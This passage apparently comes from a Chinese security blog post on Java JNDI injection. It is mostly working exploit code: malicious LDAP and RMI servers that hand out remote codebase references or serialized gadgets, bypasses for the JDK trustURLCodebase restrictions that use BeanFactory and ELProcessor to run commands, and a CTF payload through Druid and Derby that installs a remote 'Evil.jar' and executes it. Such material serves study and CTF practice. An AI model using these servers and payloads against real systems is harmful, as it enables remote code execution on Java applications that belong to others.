+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;
+<span class="hljs-keyword">import</span> com.unboundid.util.Base64;
+
+<span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;
+<span class="hljs-keyword">import</span> javax.net.SocketFactory;
+<span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;
+<span class="hljs-keyword">import</span> java.net.InetAddress;
+<span class="hljs-keyword">import</span> java.net.MalformedURLException;
+<span class="hljs-keyword">import</span> java.net.URL;
+<span class="hljs-keyword">import</span> java.text.ParseException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span>&#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#Evil&quot;</span>;
+        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;
+
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);
+            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(
+                    <span class="hljs-string">&quot;listen&quot;</span>,
+                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));
+            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);
+            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);
+            ds.startListening();
+
+        &#125;
+        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;
+
+        <span class="hljs-keyword">private</span> URL codebase;
+        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;
+            <span class="hljs-built_in">this</span>.codebase = cb;
+        &#125;
+        <span class="hljs-comment">/**</span>
+<span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span>
+<span class="hljs-comment">         *</span>
+<span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span>
+<span class="hljs-comment">         */</span>
+        <span class="hljs-meta">@Override</span>
+        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">(InMemoryInterceptedSearchResult result )</span> &#123;
+            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();
+            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);
+            <span class="hljs-keyword">try</span> &#123;
+                sendResult(result, base, e);
+            &#125;
+            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;
+                e1.printStackTrace();
+            &#125;
+
+        &#125;
+
+        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;
+            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));
+            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);
+            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);
+            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();
+            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);
+            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;
+                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);
+            &#125;
+<span class="hljs-comment">//             Payload1: 利用 LDAP + Reference Factory</span>
+            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);
+            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);
+            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());
+<span class="hljs-comment">//             Payload2: 返回序列化 Gadget</span>
+<span class="hljs-comment">//            try &#123;</span>
+<span class="hljs-comment">//                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;...&quot;));</span>
+<span class="hljs-comment">//            &#125; catch (ParseException exception) &#123;</span>
+<span class="hljs-comment">//                exception.printStackTrace();</span>
+<span class="hljs-comment">//            &#125;</span>
+
+            result.sendSearchEntry(e);
+            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));
+        &#125;
+
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;
+
+<span class="hljs-keyword">import</span> javax.naming.InitialContext;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIDemo</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();
+        ctx.lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/test&quot;</span>);
+    &#125;
+&#125;</code></pre></div>
+
+<h5 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h5><p>自行下断点</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418223621771.png" srcset="/img/loading.gif" lazyload alt="image-20240418223621771"></p>
+<p>LDAP 的通信过程中存在一个 <code>JAVA_ATTRIBUTES</code> 静态数组, 通过它来获取 attribute name 然后去 var0 中查询</p>
+<p>我们服务端中手动添加</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418222242882.png" srcset="/img/loading.gif" lazyload alt="image-20240418222242882"></p>
+<p>之后会回到原来的 LdapCtx, 调用 <code>DirectoryManager.getObjectInstance()</code></p>
+<p>最后仍是到这里</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418195237564.png" srcset="/img/loading.gif" lazyload alt="image-20240418195237564"></p>
+<h2 id="绕过jdk高版本限制"><a href="#绕过jdk高版本限制" class="headerlink" title="绕过jdk高版本限制"></a>绕过jdk高版本限制</h2><p>高版本 jdk 做出的一些限制</p>
+<ul>
+<li><strong>6u45 7u21 之后</strong>: <code>java.rmi.server.useCodebaseOnly</code> 默认为 true, 禁止利用 RMI ClassLoader 加载远程类 (但是 Reference 加载远程类本质上利用的是 URLClassLoader, 所以该参数对于 JNDI 注入无任何影响 )</li>
+<li><strong>6u141, 7u131, 8u121 之后</strong>: <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 和 <code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 默认为 false, 禁止 RMI 和 CORBA 协议使用远程 codebase 来进行 JNDI 注入</li>
+<li><strong>6u211, 7u201, 8u191 之后</strong>: <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认为 false, 禁止 LDAP 协议使用远程 codebase 来进行 JNDI 注入</li>
+</ul>
+<p>下面会列举一些绕过高版本 jdk 来进行 JNDI 注入的方法</p>
+<h3 id="本地-（无用）"><a href="#本地-（无用）" class="headerlink" title="本地 （无用）"></a>本地 （无用）</h3><p>把属性设置为true</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">InitialContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InitialContext()</span>;
+
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>)</span>;
+context.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/test&quot;</span>);
+
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>)</span>;
+context.lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/test&quot;</span>);</code></pre></div>
+
+<h3 id="利用本地-Class-作为-Factory"><a href="#利用本地-Class-作为-Factory" class="headerlink" title="利用本地 Class 作为 Factory"></a>利用本地 Class 作为 Factory</h3><p>原理很简单, 既然禁止通过 codebase 远程加载, 那就去加载一个能够利用的本地 factory 然后执行 java 代码</p>
+<p>但是这种利用方式受限于目标机器本地 classpath 中是否存在对应的 factory</p>
+<p>理论上根据依赖的不同, 会有很多种利用方式, 这里以网上讨论最多的 <code>org.apache.naming.factory.BeanFactory</code> 和 <code>javax.el.ELProcessor</code> 为例</p>
+<p>BeanFactory 来自 tomcat 的依赖包, 所以适用范围相对来说会广一些</p>
+<p>ELProcessor 则是 java 自带的表达式解析引擎</p>
+<p>添加如下依赖</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div>
+
+<p>。。。大佬说的这个依赖好像有点问题，会报出错误</p>
+<p>手动导入这些依赖能避免一些错误</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240419194245840.png" srcset="/img/loading.gif" lazyload alt="image-20240419194245840"></p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;
+
+<span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
+<span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;
+
+<span class="hljs-keyword">import</span> javax.naming.Context;
+<span class="hljs-keyword">import</span> javax.naming.InitialContext;
+<span class="hljs-keyword">import</span> javax.naming.StringRefAddr;
+<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;
+<span class="hljs-keyword">import</span> java.util.Properties;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);
+        env.put(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);
+
+        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);
+        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);
+
+        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);
+        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));
+        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));
+
+        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);
+        ctx.bind(<span class="hljs-string">&quot;test&quot;</span>, referenceWrapper);
+    &#125;
+&#125;</code></pre></div>
+
+<p>BeanFactory大概作用就是类似setter赋值的东西，根据这个forceString</p>
+<p>然后根据&#x3D;分割为propname和value，这里<code>x=eval ，&quot;x&quot;,&quot;........&quot;</code>其实就相当于<code>eval</code>的值为<code>......</code></p>
+<p>。。。不知道讲啥了</p>
+<p>说一下如何找Factory，要继承ObjectFactory，并且有getObjectInstance</p>
+<p>更具体的我也不会，就这样</p>
+<h3 id="LDAP返回序列化数据"><a href="#LDAP返回序列化数据" class="headerlink" title="LDAP返回序列化数据"></a>LDAP返回序列化数据</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>也很简单，和上面的前半段一样，要有javaClassName进入decodeObject</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214712148.png" srcset="/img/loading.gif" lazyload alt="image-20240425214712148"></p>
+<p>然后转换方向，进入deserializeObject，需要javaSerializedData即可</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214758541.png" srcset="/img/loading.gif" lazyload alt="image-20240425214758541"></p>
+<p>然后存在反序列化</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214913135.png" srcset="/img/loading.gif" lazyload alt="image-20240425214913135"></p>
+<p>即javaSerializedData的值为恶意序列化数据</p>
+<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;
+
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;
+
+<span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;
+<span class="hljs-keyword">import</span> javax.net.SocketFactory;
+<span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;
+<span class="hljs-keyword">import</span> java.net.InetAddress;
+<span class="hljs-keyword">import</span> java.net.MalformedURLException;
+<span class="hljs-keyword">import</span> java.net.URL;
+<span class="hljs-keyword">import</span> java.net.UnknownHostException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#Evil&quot;</span>;
+        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;
+        <span class="hljs-keyword">try</span>&#123;
+            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);
+            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(
+                    <span class="hljs-string">&quot;listen&quot;</span>,
+                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()
+            ));
+            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));
+            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);
+            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span>+port);
+            ds.startListening();
+
+
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span>&#123;
+        <span class="hljs-keyword">private</span> URL codebase;
+        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span><span class="hljs-params">(URL cb)</span>&#123;
+            <span class="hljs-built_in">this</span>.codebase = cb;
+        &#125;
+
+        <span class="hljs-meta">@Override</span>
+        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;
+            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();
+            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);
+            <span class="hljs-keyword">try</span> &#123;
+                sendResult(result,base,e);
+            &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;
+                ex.printStackTrace();
+            &#125;
+        &#125;
+
+
+        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));
+            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);
+            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>);
+            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();
+            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&quot;#&quot;</span>);
+            <span class="hljs-keyword">if</span> (refPos &gt; <span class="hljs-number">0</span>)&#123;
+                cbstring = cbstring.substring(<span class="hljs-number">0</span>,refPos);
+            &#125;
+<span class="hljs-comment">//            利用 LDAP + Reference</span>
+<span class="hljs-comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span>
+<span class="hljs-comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span>
+<span class="hljs-comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span>
+<span class="hljs-comment">//             Payload2: 返回序列化 Gadget</span>
+            <span class="hljs-keyword">try</span> &#123;
+                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;rO0ABXNyA。。。。。。。&quot;</span>));
+            &#125; <span class="hljs-keyword">catch</span> (ParseException exception) &#123;
+                exception.printStackTrace();
+            &#125;
+
+            result.sendSearchEntry(e);
+            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<h2 id="D3CTF2023-ezjava"><a href="#D3CTF2023-ezjava" class="headerlink" title="D3CTF2023  ezjava"></a>D3CTF2023  ezjava</h2><p>这里不是jndi注入，就是出现了使用BeanFactory和ELProcessor</p>
+<p>为什么能使用呢，因为ContinuationDirContext的父类ContinuationContext的getTargetContext()能够进行reference注入</p>
+<p>然后就使用这个去绕过一下高版本</p>
+<p>payload网上很多</p>
+<h2 id="N1-junior-2024"><a href="#N1-junior-2024" class="headerlink" title="N1 junior 2024"></a>N1 junior 2024</h2><h3 id="Derby"><a href="#Derby" class="headerlink" title="Derby"></a>Derby</h3><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425223635957.png" srcset="/img/loading.gif" lazyload alt="image-20240425223635957"></p>
+<p>只有一个jndi注入的路由</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425223709621.png" srcset="/img/loading.gif" lazyload alt="image-20240425223709621"></p>
+<p>唯二的依赖，druid连接池和derby数据库</p>
+<p>并且还是jdk17的高版本</p>
+<p>在Tomcat某些版本是可以BeanFactory配合EL去实现命令执行的，这里是Druid，也可以绕过，<code>DruidDataSourceFactory#getObjectInstance</code></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225128216.png" srcset="/img/loading.gif" lazyload alt="image-20240425225128216"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225141604.png" srcset="/img/loading.gif" lazyload alt="image-20240425225141604"></p>
+<p>DruidDataSourceFactory有个initConnectionSqls能够执行sql语句</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225225287.png" srcset="/img/loading.gif" lazyload alt="image-20240425225225287"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225512597.png" srcset="/img/loading.gif" lazyload alt="image-20240425225512597"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225638704.png" srcset="/img/loading.gif" lazyload alt="image-20240425225638704"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225736707.png" srcset="/img/loading.gif" lazyload alt="image-20240425225736707"></p>
+<p>至此druid就发起了jdbc连接</p>
+<p>然后就要考虑数据库进行RCE</p>
+<p>上面一处提到经由DruidDataSourceFactory能够执行sql语句</p>
+<p>但这里不是H2</p>
+<p>经过搜索文章发现derby也可以通过sql语句加载jar包进行RCE（我找不到呜呜</p>
+<p><a target="_blank" rel="noopener" href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">derby数据库如何实现RCE - lvyyevd’s 安全博客</a></p>
+<p>关于这个DruidDataSourceFactory的reference注入，放在RMI或是LDAP服务端都可以</p>
+<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+<span class="hljs-keyword">import</span> javax.naming.Reference;
+<span class="hljs-keyword">import</span> javax.naming.StringRefAddr;
+<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;
+<span class="hljs-keyword">import</span> java.rmi.registry.Registry;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DerbyEvilServer</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;
+        <span class="hljs-keyword">try</span>&#123;
+            Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);
+            Reference ref = <span class="hljs-keyword">new</span> <span class="hljs-type">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>,<span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>,<span class="hljs-literal">null</span>);
+            <span class="hljs-keyword">String</span> JDBC_URL = <span class="hljs-string">&quot;jdbc:derby:dbname;create=true&quot;</span>;
+            <span class="hljs-keyword">String</span> JDBC_USER = <span class="hljs-string">&quot;root&quot;</span>;
+            <span class="hljs-keyword">String</span> JDBC_PASSWORD = <span class="hljs-string">&quot;password&quot;</span>;
+
+            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>));
+            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));
+            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,JDBC_USER));
+            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,JDBC_PASSWORD));
+            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));
+            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;initConnectionSqls&quot;</span>,<span class="hljs-string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://host.docker.internal:8000/Evil.jar&#x27;, &#x27;APP.Sample4&#x27;, 0);CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Sample4&#x27;);CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;testShell4.exec&#x27;;CALL SALES.TOTAL_REVENUES();&quot;</span>));
